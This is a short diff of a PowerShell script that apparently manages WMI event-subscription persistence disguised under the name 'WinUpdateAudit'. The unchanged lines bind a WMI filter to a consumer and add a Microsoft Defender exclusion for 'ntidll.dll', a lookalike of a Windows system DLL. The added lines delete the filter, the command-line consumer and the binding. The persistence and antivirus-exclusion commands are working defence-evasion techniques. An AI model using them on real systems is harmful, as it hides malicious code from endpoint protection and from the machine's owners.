@@ -19,3 +19,9 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
 }
 
 Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64\ntidll.dll"
+
+
+
+    Get-CimInstance -Namespace root/subscription -ClassName __EventFilter | Where-Object {$_.Name -eq "WinUpdateAudit"} | Remove-CimInstance
+Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer | Where-Object {$_.Name -eq "WinUpdateAuditConsumer"} | Remove-CimInstance
+Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object {$_.Filter -match "WinUpdateAudit"} | Remove-CimInstance
